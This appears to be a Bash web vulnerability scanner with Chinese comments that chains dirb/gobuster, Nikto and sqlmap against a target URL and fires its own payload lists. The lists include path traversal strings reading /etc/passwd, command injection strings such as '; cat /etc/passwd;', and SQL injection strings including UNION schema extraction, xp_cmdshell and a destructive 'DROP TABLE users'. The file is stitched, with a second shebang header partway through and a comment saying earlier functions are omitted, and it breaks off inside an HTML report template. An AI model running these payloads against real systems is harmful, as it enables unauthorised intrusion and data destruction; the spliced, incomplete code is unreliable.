#!/bin/bash
# 自動化網頁漏洞掃描工具
# 功能：自動使用Dirbuster/Gobuster尋找隱藏目錄，使用Nikto進行掃描，
# 使用SQLmap尋找SQL注入漏洞，並提供備用SQL注入檢測方法

# 顏色設定
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 檢查是否以root身份執行
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}請以root身份執行此腳本!${NC}"
  exit 1
fi

# 檢查必要工具是否存在
check_requirements() {
  echo -e "${BLUE}[*] 檢查必要的工具...${NC}"

  command -v dirb >/dev/null 2>&1 || { echo -e "${YELLOW}[!] 找不到dirb！建議安裝：apt-get install dirb${NC}"; }
  command -v gobuster >/dev/null 2>&1 || { echo -e "${YELLOW}[!] 找不到gobuster！建議安裝：apt-get install gobuster${NC}"; }

  # 確保至少有一個目錄掃描工具可用
  if ! command -v dirb >/dev/null 2>&1 && ! command -v gobuster >/dev/null 2>&1; then
    echo -e "${RED}[-] 找不到dirb或gobuster！請至少安裝其中一個：${NC}"
    echo -e "${RED}    apt-get install dirb${NC}"
    echo -e "${RED}    apt-get install gobuster${NC}"
    exit 1
  fi

  command -v nikto >/dev/null 2>&1 || { echo -e "${RED}[-] 找不到nikto！請安裝：apt-get install nikto${NC}"; exit 1; }
  command -v sqlmap >/dev/null 2>&1 || { echo -e "${YELLOW}[!] 找不到sqlmap！使用備用SQL注入檢測方法${NC}"; }
  command -v curl >/dev/null 2>&1 || { echo -e "${RED}[-] 找不到curl！請安裝：apt-get install curl${NC}"; exit 1; }
  command -v whatweb >/dev/null 2>&1 || { echo -e "${YELLOW}[!] 找不到whatweb！建議安裝：apt-get install whatweb${NC}"; }

  echo -e "${GREEN}[+] 工具檢查完成${NC}"
}

# 使用方法
usage() {
  echo -e "用法: $0 -u <URL> [選項]"
  echo -e "選項:"
  echo -e "  -u, --url URL       要掃描的目標URL (必須)"
  echo -e "  -o, --output DIR    輸出目錄 (預設: ./scan_results)"
  echo -e "  -w, --wordlist FILE 用於目錄暴力破解的字典檔 (預設: /usr/share/dirb/wordlists/common.txt)"
  echo -e "  -t, --threads NUM   執行緒數量 (預設: 10)"
  echo -e "  -d, --depth NUM     目錄爬行深度 (預設: 3)"
  echo -e "  -T, --tool NAME     指定目錄掃描工具 (dirb 或 gobuster, 預設: 自動選擇可用工具)"
  echo -e "  -e, --extensions EXT 檔案擴展名 (僅 gobuster, 例如: php,html,txt)"
  echo -e "  -s, --sql-level NUM SQLMap注入級別 (預設: 1，最高: 5)"
  echo -e "  -n, --nikto-full    執行完整的Nikto掃描 (預設: 快速掃描)"
  echo -e "  -D, --disable-alt-sql 停用備用SQL注入檢測方法"
  echo -e "  -P, --disable-path-traversal 停用路徑遍歷檢測"
  echo -e "  -C, --disable-cmd-injection 停用命令注入檢測"
  echo -e "  -h, --help          顯示此幫助信息"
  echo -e "\n範例: $0 -u http://example.com -o ./results -w /usr/share/wordlists/dirb/big.txt -T gobuster -e php,html"
  exit 1
}

# 解析命令行參數
parse_arguments() {
  # 預設值
  TARGET_URL=""
  OUTPUT_DIR="./scan_results"
  WORDLIST="/usr/share/dirb/wordlists/common.txt"
  THREADS=10
  DEPTH=3
  SCAN_TOOL=""  # 自動選擇
  FILE_EXTENSIONS=""
  SQL_LEVEL=1
  NIKTO_FULL=false
  DISABLE_ALT_SQL=false
  DISABLE_PATH_TRAVERSAL=false
  DISABLE_CMD_INJECTION=false

  # 解析參數
  while [[ "$#" -gt 0 ]]; do
    case $1 in
      -u|--url) TARGET_URL="$2"; shift ;;
      -o|--output) OUTPUT_DIR="$2"; shift ;;
      -w|--wordlist) WORDLIST="$2"; shift ;;
      -t|--threads) THREADS="$2"; shift ;;
      -d|--depth) DEPTH="$2"; shift ;;
      -T|--tool) SCAN_TOOL="$2"; shift ;;
      -e|--extensions) FILE_EXTENSIONS="$2"; shift ;;
      -s|--sql-level) SQL_LEVEL="$2"; shift ;;
      -n|--nikto-full) NIKTO_FULL=true ;;
      -D|--disable-alt-sql) DISABLE_ALT_SQL=true ;;
      -P|--disable-path-traversal) DISABLE_PATH_TRAVERSAL=true ;;
      -C|--disable-cmd-injection) DISABLE_CMD_INJECTION=true ;;
      -h|--help) usage ;;
      *) echo -e "${RED}未知選項: $1${NC}"; usage ;;
    esac
    shift
  done

  # 檢查必填參數
  if [ -z "$TARGET_URL" ]; then
    echo -e "${RED}錯誤: 需要目標URL${NC}"
    usage
  fi

  # 檢查URL格式
  if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    echo -e "${YELLOW}警告: URL應該以http://或https://開頭，自動加上http://${NC}"
    TARGET_URL="http://$TARGET_URL"
  fi

  # 建立輸出目錄
  mkdir -p "$OUTPUT_DIR"
  echo -e "${GREEN}[+] 結果將儲存在: $OUTPUT_DIR${NC}"
}

# 使用WhatWeb檢測Web技術
detect_web_technologies() {
  echo -e "\n${BLUE}[*] 使用WhatWeb檢測Web技術...${NC}"
  local output_file="$OUTPUT_DIR/whatweb_results.txt"

  if command -v whatweb >/dev/null 2>&1; then
    whatweb -v "$TARGET_URL" > "$output_file"
    echo -e "${GREEN}[+] WhatWeb掃描完成，結果保存在: $output_file${NC}"
  else
    echo -e "${YELLOW}[!] WhatWeb未安裝，跳過Web技術檢測${NC}"
  fi
}

# 尋找隱藏目錄
find_hidden_directories() {
  local output_file="$OUTPUT_DIR/directory_scan_results.txt"
  local urls_file="$OUTPUT_DIR/discovered_urls.txt"

  # 決定使用哪個工具
  if [ -z "$SCAN_TOOL" ]; then
    # 自動選擇工具
    if command -v gobuster >/dev/null 2>&1; then
      SCAN_TOOL="gobuster"
    elif command -v dirb >/dev/null 2>&1; then
      SCAN_TOOL="dirb"
    else
      echo -e "${RED}[-] 找不到目錄掃描工具！${NC}"
      exit 1
    fi
  else
    # 檢查指定的工具是否安裝
    if ! command -v "$SCAN_TOOL" >/dev/null 2>&1; then
      echo -e "${RED}[-] 找不到指定的工具: $SCAN_TOOL${NC}"
      exit 1
    fi
  fi

  echo -e "\n${BLUE}[*] 使用 $SCAN_TOOL 尋找隱藏目錄...${NC}"
  echo -e "${YELLOW}[*] 使用字典檔: $WORDLIST${NC}"

  # 根據選擇的工具執行不同的命令
  if [ "$SCAN_TOOL" = "dirb" ]; then
    echo -e "${YELLOW}[*] 掃描深度: $DEPTH${NC}"

    # 使用dirb進行目錄暴力破解
    dirb "$TARGET_URL" "$WORDLIST" -o "$output_file" -r -z 10

    # 檢查結果
    if [ -f "$output_file" ]; then
      local dir_count=$(grep "CODE:200" "$output_file" | wc -l)
      echo -e "${GREEN}[+] 發現 $dir_count 個目錄和檔案${NC}"
      echo -e "${GREEN}[+] 結果保存在: $output_file${NC}"

      # 提取所有發現的URL到一個檔案，供後續使用
      grep -oE "http[s]?://[^[:space:]]+" "$output_file" > "$urls_file"
    else
      echo -e "${RED}[-] dirb掃描失敗或沒有發現任何目錄${NC}"
    fi
  elif [ "$SCAN_TOOL" = "gobuster" ]; then
    echo -e "${YELLOW}[*] 使用 gobuster 的 dir 模式${NC}"

    # 準備 gobuster 參數
    local gobuster_args="-u $TARGET_URL -w $WORDLIST -o $output_file -q"

    # 添加執行緒數量
    gobuster_args="$gobuster_args -t $THREADS"

    # 如果有指定擴展名，則添加
    if [ -n "$FILE_EXTENSIONS" ]; then
      echo -e "${YELLOW}[*] 搜索擴展名: $FILE_EXTENSIONS${NC}"
      gobuster_args="$gobuster_args -x $FILE_EXTENSIONS"
    fi

    # 使用 gobuster 進行目錄暴力破解
    gobuster dir $gobuster_args

    # 檢查結果
    if [ -f "$output_file" ]; then
      local dir_count=$(grep -c "Status: 200" "$output_file")
      echo -e "${GREEN}[+] 發現 $dir_count 個目錄和檔案${NC}"
      echo -e "${GREEN}[+] 結果保存在: $output_file${NC}"

      # 提取所有發現的URL到一個檔案，供後續使用
      sed -n 's/^.*\(http[s]\?:\/\/[^ ]*\).*/\1/p' "$output_file" > "$urls_file"
    else
      echo -e "${RED}[-] gobuster掃描失敗或沒有發現任何目錄${NC}"
    fi
  else
    echo -e "${RED}[-] 未知的掃描工具: $SCAN_TOOL${NC}"
    exit 1
  fi
}

# 使用Nikto進行掃描
run_nikto_scan() {
  echo -e "\n${BLUE}[*] 使用Nikto進行漏洞掃描...${NC}"
  local output_file="$OUTPUT_DIR/nikto_results.txt"

  # 決定掃描類型 (快速或完整)
  if [ "$NIKTO_FULL" = true ]; then
    echo -e "${YELLOW}[*] 使用完整模式進行Nikto掃描...${NC}"
    echo -e "${YELLOW}[*] 注意: 這可能需要相當長的時間${NC}"
    nikto -h "$TARGET_URL" -o "$output_file" -Format txt
  else
    # 使用Nikto進行掃描 (預設使用快速掃描模式 -Tuning x 6)
    echo -e "${YELLOW}[*] 使用快速掃描模式進行Nikto掃描${NC}"
    nikto -h "$TARGET_URL" -o "$output_file" -Format txt -Tuning x 6
  fi

  # 檢查結果
  if [ -f "$output_file" ]; then
    local vuln_count=$(grep -i "vulnerability" "$output_file" | wc -l)
    echo -e "${GREEN}[+] Nikto掃描完成，發現 $vuln_count 個潛在漏洞${NC}"
    echo -e "${GREEN}[+] 結果保存在: $output_file${NC}"
  else
    echo -e "${RED}[-] Nikto掃描失敗${NC}"
  fi
}

# 檢測路徑遍歷漏洞
detect_path_traversal() {
  if [ "$DISABLE_PATH_TRAVERSAL" = true ]; then
    echo -e "\n${YELLOW}[*] 路徑遍歷檢測已禁用${NC}"
    return
  fi
  echo -e "\n${BLUE}[*] 檢測路徑遍歷漏洞...${NC}"
  local output_file="$OUTPUT_DIR/path_traversal_results.txt"
  local urls_file="$OUTPUT_DIR/discovered_urls.txt"
  local has_vulnerability=false

  # 路徑遍歷測試向量
  local traversal_payloads=(
    "../../../etc/passwd"
    "..././..././..././etc/passwd"
    "....//....//....//etc/passwd"
    "/etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "/var/www/images/../../etc/passwd"
  )

  # 如果有發現的URL
  if [ -f "$urls_file" ]; then
    while read -r url; do
      if [[ "$url" =~ (\?|\&)([^=]+)\= ]]; then
        param=${BASH_REMATCH[2]}
        base_url="${url%%\?*}"
        query_string="${url#*\?}"

        for payload in "${traversal_payloads[@]}"; do
          # 替換參數值為測試向量
          modified_query=$(echo "$query_string" | sed "s/$param=[^&]*/$param=$payload/")
          test_url="$base_url?$modified_query"

          echo -e "${YELLOW}[*] 測試路徑遍歷: $test_url${NC}"
          response=$(curl -s "$test_url")

          # 檢查是否包含/etc/passwd的內容
          if echo "$response" | grep -q "root:x:0:0:"; then
            echo -e "${GREEN}[+] 發現路徑遍歷漏洞!${NC}"
            echo -e "${GREEN}[+] 易受攻擊的URL: $test_url${NC}"
            echo "易受攻擊的URL: $test_url" >> "$output_file"
            echo "使用的有效載荷: $payload" >> "$output_file"
            echo "$response" | head -20 >> "$output_file"
            echo "----------------------------------------" >> "$output_file"
            has_vulnerability=true
          fi
        done
      fi
    done < "$urls_file"
  fi

  # 直接測試主URL的參數
  if [[ "$TARGET_URL" =~ (\?|\&)([^=]+)\= ]]; then
    param=${BASH_REMATCH[2]}
    base_url="${TARGET_URL%%\?*}"
    query_string="${TARGET_URL#*\?}"

    for payload in "${traversal_payloads[@]}"; do
      # 替換參數值為測試向量
      modified_query=$(echo "$query_string" | sed "s/$param=[^&]*/$param=$payload/")
      test_url="$base_url?$modified_query"

      echo -e "${YELLOW}[*] 測試路徑遍歷: $test_url${NC}"
      response=$(curl -s "$test_url")

      # 檢查是否包含/etc/passwd的內容
      if echo "$response" | grep -q "root:x:0:0:"; then
        echo -e "${GREEN}[+] 發現路徑遍歷漏洞!${NC}"
        echo -e "${GREEN}[+] 易受攻擊的URL: $test_url${NC}"
        echo "易受攻擊的URL: $test_url" >> "$output_file"
        echo "使用的有效載荷: $payload" >> "$output_file"
        echo "$response" | head -20 >> "$output_file"
        echo "----------------------------------------" >> "$output_file"
        has_vulnerability=true
      fi
    done
  fi

  if [ "$has_vulnerability" = false ]; then
    echo -e "${YELLOW}[*] 未發現路徑遍歷漏洞${NC}"
    echo "未發現路徑遍歷漏洞" > "$output_file"
  fi

  echo -e "${GREEN}[+] 路徑遍歷檢測完成，結果保存在: $output_file${NC}"
}

# 檢測命令注入漏洞
detect_command_injection() {
  if [ "$DISABLE_CMD_INJECTION" = true ]; then
    echo -e "\n${YELLOW}[*] 命令注入檢測已禁用${NC}"
    return
  fi
  echo -e "\n${BLUE}[*] 檢測命令注入漏洞...${NC}"
  local output_file="$OUTPUT_DIR/command_injection_results.txt"
  local urls_file="$OUTPUT_DIR/discovered_urls.txt"
  local has_vulnerability=false

  # 命令注入測試向量
  local cmd_payloads=(
    "$(sleep 5)"
    "\$(sleep 5)"
    "; sleep 5;"
    "| sleep 5"
    "|| sleep 5"
    "& sleep 5"
    "&& sleep 5"
    "\`sleep 5\`"
    "; cat /etc/passwd;"
    "| cat /etc/passwd"
  )

  cmd_injection_test() {
    local url="$1"
    local payload="$2"
    local orig_url="$url"

    # 檢測參數
    if [[ "$url" =~ (\?|\&)([^=]+)\= ]]; then
      param=${BASH_REMATCH[2]}
      base_url="${url%%\?*}"
      query_string="${url#*\?}"

      # 替換參數值為測試向量
      modified_query=$(echo "$query_string" | sed "s/$param=[^&]*/$param=$payload/")
      url="$base_url?$modified_query"
    else
      # 如果沒有參數，跳過測試
      return 1
    fi

    echo -e "${YELLOW}[*] 測試命令注入: $url${NC}"

    # 測量回應時間
    start_time=$(date +%s.%N)
    response=$(curl -s "$url")
    end_time=$(date +%s.%N)

    duration=$(echo "$end_time - $start_time" | bc)

    # 對於sleep命令，檢查回應是否延遲
    if [[ "$payload" =~ sleep && $(echo "$duration > 4.5" | bc) -eq 1 ]]; then
      echo -e "${GREEN}[+] 發現命令注入漏洞!${NC}"
      echo -e "${GREEN}[+] 易受攻擊的URL: $orig_url${NC}"
      echo -e "${GREEN}[+] 響應時間: $duration 秒${NC}"
      echo "易受攻擊的URL: $orig_url" >> "$output_file"
      echo "使用的有效載荷: $payload" >> "$output_file"
      echo "響應時間: $duration 秒" >> "$output_file"
      echo "----------------------------------------" >> "$output_file"
      has_vulnerability=true
      return 0

    # 對於cat命令，檢查回應是否包含/etc/passwd的內容  
    elif [[ "$payload" =~ cat && "$response" =~ root:x:0:0: ]]; then
      echo -e "${GREEN}[+] 發現命令注入漏洞!${NC}"
      echo -e "${GREEN}[+] 易受攻擊的URL: $orig_url${NC}"
      echo "易受攻擊的URL: $orig_url" >> "$output_file"
      echo "使用的有效載荷: $payload" >> "$output_file"
      echo "$response" | head -20 >> "$output_file"
      echo "----------------------------------------" >> "$output_file"
      has_vulnerability=true
      return 0
    fi

    return 1
  }

  # 如果有發現的URL
  if [ -f "$urls_file" ]; then
    while read -r url; do
      for payload in "${cmd_payloads[@]}"; do
        cmd_injection_test "$url" "$payload"
      done
    done < "$urls_file"
  fi

  # 直接測試主URL
  for payload in "${cmd_payloads[@]}"; do
    cmd_injection_test "$TARGET_URL" "$payload"
  done

  if [ "$has_vulnerability" = false ]; then
    echo -e "${YELLOW}[*] 未發現命令注入漏洞${NC}"
    echo "未發現命令注入漏洞" > "$output_file"
  fi

  echo -e "${GREEN}[+] 命令注入檢測完成，結果保存在: $output_file${NC}"
}

# 自動尋找SQL注入漏洞 (使用SQLMap)
find_sql_injections() {
  echo -e "\n${BLUE}[*] 開始尋找SQL注入漏洞...${NC}"
  local output_dir="$OUTPUT_DIR/sqlmap_results"
  mkdir -p "$output_dir"

  # 檢查 SQLmap 版本以使用合適的參數
  local sqlmap_version=$(sqlmap --version 2>/dev/null | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | head -n 1)
  local sqlmap_params=""

  # 根據版本設置合適的參數
  if [[ -z "$sqlmap_version" ]]; then
    echo -e "${YELLOW}[!] 無法確定 SQLmap 版本，使用基本參數${NC}"
    sqlmap_params="--batch --forms --threads=$THREADS"
  else
    echo -e "${YELLOW}[*] 檢測到 SQLmap 版本: $sqlmap_version${NC}"
    # 比較版本號決定使用哪些參數
    if [[ $(echo "$sqlmap_version" | awk -F. '{ printf("%d%03d%03d\n", $1,$2,$3); }') -ge $(echo "1.0.0" | awk -F. '{ printf("%d%03d%03d\n", $1,$2,$3); }') ]]; then
      # 新版 SQLmap 使用更多參數
      sqlmap_params="--batch --forms --threads=$THREADS"
      # 檢查 level 參數是否支持
      if sqlmap --help 2>&1 | grep -q -- "--level"; then
        sqlmap_params="$sqlmap_params --level=$SQL_LEVEL --risk=2"
      fi
    else
      # 舊版 SQLmap 使用基本參數
      sqlmap_params="--batch --forms --threads=$THREADS"
    fi
  fi

  # 添加備用方案 - 如果 sqlmap 命令失敗，使用更基本的參數
  test_sqlmap_command() {
    local test_cmd="sqlmap --version"
    if ! eval $test_cmd &>/dev/null; then
      echo -e "${RED}[!] SQLmap 命令測試失敗，可能存在兼容性問題${NC}"
      return 1
    fi
    return 0
  }

  # 首先檢查主URL
  echo -e "${YELLOW}[*] 檢查主URL是否存在SQL注入漏洞${NC}"
  if test_sqlmap_command; then
    sqlmap -u "$TARGET_URL" $sqlmap_params --output-dir="$output_dir"
  else
    echo -e "${RED}[!] SQLmap 執行失敗，嘗試使用備用參數${NC}"
    sqlmap -u "$TARGET_URL" --batch --output-dir="$output_dir"
  fi

  # 檢查是否有發現的URL
  if [ -f "$OUTPUT_DIR/discovered_urls.txt" ]; then
    echo -e "${YELLOW}[*] 檢查所有發現的URL是否存在SQL注入漏洞${NC}"

    # 遍歷所有發現的URL
    while read -r url; do
      # 檢查URL是否包含參數
      if [[ "$url" == *\?* ]]; then
        echo -e "${YELLOW}[*] 檢查URL: $url${NC}"
        sqlmap -u "$url" $sqlmap_params --output-dir="$output_dir"
      fi
    done < "$OUTPUT_DIR/discovered_urls.txt"
  fi

  # 使用爬蟲模式尋找更多潛在的注入點（如果支持 --crawl 參數）
  if sqlmap --help 2>&1 | grep -q -- "--crawl"; then
    echo -e "${YELLOW}[*] 使用爬蟲模式尋找更多潛在的注入點${NC}"
    sqlmap -u "$TARGET_URL" $sqlmap_params --crawl="$DEPTH" --output-dir="$output_dir"
  else
    echo -e "${YELLOW}[*] 此版本 SQLmap 不支持爬蟲功能，跳過此步驟${NC}"
  fi

  echo -e "${GREEN}[+] SQL注入漏洞掃描完成${NC}"
  echo -e "${GREEN}[+] 結果保存在: $output_dir${NC}"
}

# 備用的 SQL 注入漏洞掃描功能（使用 curl 和基本測試向量）
#!/bin/bash
# （省略了之前的 check_requirements, usage, parse_arguments, detect_web_technologies,
#   find_hidden_directories, run_nikto_scan, detect_path_traversal, detect_command_injection,
#   find_sql_injections 函數，這些函數與之前的版本相同）
# 備用的 SQL 注入漏洞掃描功能（使用 curl 和基本測試向量）
find_sql_injections_alternative() {
  if [ "$DISABLE_ALT_SQL" = true ]; then
    echo -e "\n${YELLOW}[*] 備用SQL注入檢測已禁用${NC}"
    return
  fi
  echo -e "\n${BLUE}[*] 使用備用方法尋找SQL注入漏洞...${NC}"
  local output_dir="$OUTPUT_DIR/sql_injection_results"
  local results_file="$output_dir/results.txt"
  mkdir -p "$output_dir"

  local payloads=(
        "'"
        "\""
        "1 OR 1=1"
        "1' OR '1'='1"
        "1\" OR \"1\"=\"1"
        "1 UNION SELECT 1,2,3,4,5-- -"
        "1' UNION SELECT 1,2,3,4,5-- -"
        "1\" UNION SELECT 1,2,3,4,5-- -"
        "admin' --"
        "admin'/*"
        "admin' or '1'='1"
        "' or 1=1#"
        "' or 1=1/*"
        "') or ('1'='1"
        "') or ('1'='1'--"
        "1'; DROP TABLE users--"
        "1'; SELECT @@version--"
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
        "' UNION SELECT @@version,NULL,NULL,NULL,NULL-- -"
        "' UNION SELECT NULL,@@database,NULL,NULL,NULL-- -"
        "' UNION SELECT NULL,NULL,USER(),NULL,NULL-- -"
        "' UNION SELECT NULL,NULL,NULL,table_name,NULL FROM information_schema.tables-- -"
        "' UNION SELECT NULL,NULL,NULL,NULL,column_name FROM information_schema.columns-- -"
        "' AND (SELECT 9900 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(9900=9900,1))),0x7176706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- "
        "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),1,0)))-- "
        "' OR '1'='1' -- "
        "' OR 'a'='a' -- "
        "' OR 1=1 -- "
        "' OR 1=1 # "
        "admin' -- "
        "admin' # "
        "' HAVING 1=1 -- "
        "' GROUP BY columnnames HAVING 1=1 -- "
        "1' OR SLEEP(5) -- "
        "1' OR SLEEP(5)# "
        "' OR BENCHMARK(5000000,MD5('A')) -- "
        "1 OR SLEEP(5) -- "
        "'; WAITFOR DELAY '0:0:5' -- "
        "1; WAITFOR DELAY '0:0:5' -- "
        "' EXEC XP_CMDSHELL 'ping 127.0.0.1' -- "
        "'; EXEC XP_CMDSHELL 'ping 127.0.0.1' -- "
        "') OR ('a'='a"
        "')) OR (('a'='a"
        "SLEEP(5)/*' OR SLEEP(5) OR '*/SLEEP(5)"
        "pg_sleep(5)/*' OR pg_sleep(5) OR '*/pg_sleep(5)"
  )

    # 更精确的错误模式，并排除一些误报
    local error_patterns=(
        "You have an error in your SQL syntax"
        "check the manual that corresponds to your (MySQL|MariaDB) server version"
        "Warning: mysql_fetch_"
        "Warning: mysqli_fetch_"
        "supplied argument is not a valid MySQL result resource"
        "Microsoft OLE DB Provider for ODBC Drivers"
        "Microsoft OLE DB Provider for SQL Server"
        "Unclosed quotation mark after the character string"
        "SQLSTATE\\[.*]: Syntax error or access violation"
        "java\\.sql\\.SQLException"  # Java
        "org\\.hibernate\\.exception" # Hibernate
        "org\\.springframework\\.jdbc" # Spring
        "System\\.Data\\.SqlClient\\.SqlException" # .NET
        "ORA-\\d+: " # Oracle
    )

    # 要排除的误报模式
    local false_positive_patterns=(
        "Internal Server Error"
    )


  local alt_sqli_html="" # 用于存储HTML
  declare -A response_lengths # 用于存储响应长度,  key: payload_url,  value: length
  declare -A vulnerable_urls  # 存储可疑的URL, key: payload_url, value: "payload (length diff: ...)"

    test_url_for_sqli() {
        local url="$1"
        local payload="$2"
        local payload_url
        local http_code
        local modified_response

        # 构建 payload URL
        local base_url="${url%%\?*}"
        local query_string="${url#*\?}"

        if [[ -z "$query_string" ]]; then
            payload_url="${url}?sqli_test=${payload}"
        else
            local params_str=$query_string
            local IFS='&'
            local params=($params_str)
            local modified_query=""

            for param_pair in "${params[@]}"; do
                if [[ "$param_pair" =~ ([^=]+)\=(.*) ]]; then
                    local param_name="${BASH_REMATCH[1]}"
                    local param_value="${BASH_REMATCH[2]}"
                    local new_param_value=$(printf '%q' "$payload")  # Use printf '%q' for proper escaping
                    modified_query+="&${param_name}=${new_param_value}"
                else
                    modified_query+="&${param_pair}"
                fi
            done
            modified_query=${modified_query:1}
            payload_url="$base_url?$modified_query"
             if [[ "$url" == *\?*=* ]] && [[ ! "$url" =~ (\?|\&)([^=]+)\= ]];then #url有参数但格式不规范
                payload_url="${url}&sqli_test=${payload}"
            fi
        fi



        echo -e "${YELLOW}[*] 測試有效載荷: $payload  -> $payload_url${NC}"  # Debug: Show payload and URL
        modified_response=$(curl -s -L -w " %{http_code}" "$payload_url")
        http_code=$(echo "$modified_response" | awk '{print $NF}')
        modified_response=$(echo "$modified_response" | sed 's/[[:space:]]*$//')

        if [[ "$http_code" =~ ^(4|5) ]]; then
            echo -e "${YELLOW}[!] 收到 HTTP 错误代码 $http_code, 跳过此 payload${NC}"
            return 1
        fi

        # 存储响应长度
        response_lengths["$payload_url"]=${#modified_response}
        return 0
    }

  # 记录开始时间
  local scan_start_time=$(date +%s)

  # 測試主 URL
  echo -e "${YELLOW}[*] 檢查主URL是否存在SQL注入漏洞${NC}"
  for payload in "${payloads[@]}"; do
    test_url_for_sqli "$TARGET_URL" "$payload"
  done

  # 檢查是否有發現的URL
  if [ -f "$OUTPUT_DIR/discovered_urls.txt" ]; then
    echo -e "${YELLOW}[*] 檢查所有發現的URL是否存在SQL注入漏洞${NC}"
    while read -r url; do
      if [[ "$url" == *\?* ]]; then
        for payload in "${payloads[@]}"; do
          test_url_for_sqli "$url" "$payload"
        done
      fi
    done < "$OUTPUT_DIR/discovered_urls.txt"
  fi

  # 找出最常见的响应长度 (众数)
    local mode_length=$(
        for length in "${response_lengths[@]}"; do
            echo "$length"
        done | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}'
    )

    if [[ -z "$mode_length" ]]; then
        echo -e "${RED}[-] 无法计算众数长度，可能是所有请求都失败了。${NC}"
        return 1
    fi

  # 计算与众数的最大允许偏差
  local length_threshold=$((mode_length * 20 / 100))
  if [ $length_threshold -lt 100 ]; then
    length_threshold=100
  fi


    # 标记可疑的 URL
    local found_vulnerabilities=false
    for url in "${!response_lengths[@]}"; do
        local length=${response_lengths[$url]}
        local diff=$((length - mode_length))
        # 从URL中提取payload
        local inject_payload=$(echo "$url" | sed 's/^.*\?//' | sed 's/&/\n/g' | grep '=' | sed "s/.*=//")

        if [ $diff -gt $length_threshold ] || [ $diff -lt "-$length_threshold" ]; then
            # 记录  URL + payload + 长度差异
            vulnerable_urls["$url"]="Payload: $inject_payload (length diff: $diff)"
            alt_sqli_html+="<div class='alert-high'><p><strong>可疑的 URL:</strong> <a href='${url}' target='_blank'>${url}</a></p><p><strong>长度差异:</strong> ${diff}</p></div>"
            found_vulnerabilities=true
            echo -e "${YELLOW}[+] 可疑的 URL: $url (长度差异: $diff)${NC}"
        fi
    done

  # 记录结束时间, 汇总,  输出 (与之前版本基本相同, 但现在直接使用 $key)
    # 记录结束时间
  local scan_end_time=$(date +%s)
  local scan_duration=$((scan_end_time - scan_start_time))

  # 匯總 (根据是否有可疑 URL)
  echo -e "\n${BLUE}[*] SQL注入漏洞掃描摘要：${NC}"
  if $found_vulnerabilities; then
    echo -e "${GREEN}[+] 發現 ${#vulnerable_urls[@]} 個可疑的SQL注入漏洞${NC}"
     echo -e "\n\n======== SQL注入漏洞掃描摘要 ========" >> "$results_file"
    echo -e "掃描時間: $scan_duration 秒" >> "$results_file"
    echo -e "發現漏洞數量: ${#vulnerable_urls[@]}\n" >> "$results_file"

        echo -e "${YELLOW}可疑的URL列表：${NC}"
        for key in "${!vulnerable_urls[@]}"; do
        echo -e "${GREEN}- URL: $key${NC}"  # 直接输出完整的 URL
        echo -e "${GREEN}  信息: ${vulnerable_urls[$key]}${NC}"
        echo -e ""

        # 添加到摘要
        echo -e "URL: $key" >> "$results_file" #直接输出完整的URL
        echo -e "信息: ${vulnerable_urls[$key]}" >> "$results_file"
        echo -e "-------------------------------------------" >> "$results_file"
        done
  else
     echo -e "${YELLOW}[*] 未發現可疑的SQL注入漏洞 (所有响应长度一致)${NC}"
    echo "未發現可疑的SQL注入漏洞" > "$results_file"
  fi
    echo -e "${GREEN}[+] 備用SQL注入漏洞掃描完成${NC}"
    echo -e "${GREEN}[+] 結果保存在: $output_dir${NC}"
}

# 生成報告 (現在是完整的函數)
generate_report() {
  echo -e "\n${BLUE}[*] 生成掃描報告...${NC}"
  local report_file="$OUTPUT_DIR/scan_report.txt"
  local html_report="$OUTPUT_DIR/scan_report.html"

  # 報告標題
  echo "=================================================================" > "$report_file"
  echo "             網頁漏洞掃描報告 - $(date)" >> "$report_file"
  echo "=================================================================" >> "$report_file"
  echo "" >> "$report_file"
  echo "目標URL: $TARGET_URL" >> "$report_file"
  echo "掃描時間: $(date)" >> "$report_file"
  echo "" >> "$report_file"
  
    # HTML 報告頭部
  cat > "$html_report" <<EOL
<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>網頁漏洞掃描報告 - $(date)</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    h1, h2, h3 {
      color: #2c3e50;
    }
    h1 {
      border-bottom: 2px solid #3498db;
      padding-bottom: 10px;
    }
    h2 {
      margin-top: 30px;
      border-bottom: 1px solid #bdc3c7;
      padding-bottom: 5px;
    }
    .report-header {
      background-color: #f8f9fa;
      padding: 20px;
      border-radius: 5px;
      margin-bottom: 30px;
      border-left: 4px solid #3498db;
    }
    .alert-high {
      background-color: #f8d7da;
      border-left: 4px solid #dc3545;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 4px;
    }
    .alert-medium {
      background-color: #fff3cd;
      border-left: 4px solid #ffc107;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 4px;
    }
    .alert-low {
      background-color: #d1ecf1;
      border-left: 4px solid #17a2b8;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 4px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 20px 0;
      font-size: 0.9em;
    }
    th, td {
      padding: 12px;
      text-align: left;
      border-bottom: 1px solid #ddd;
    }
    th {
      background-color: #f2f2f2;
      font-weight: bold;
    }
    tr:hover {
      background-color: #f5f5f5;
    }
    code {
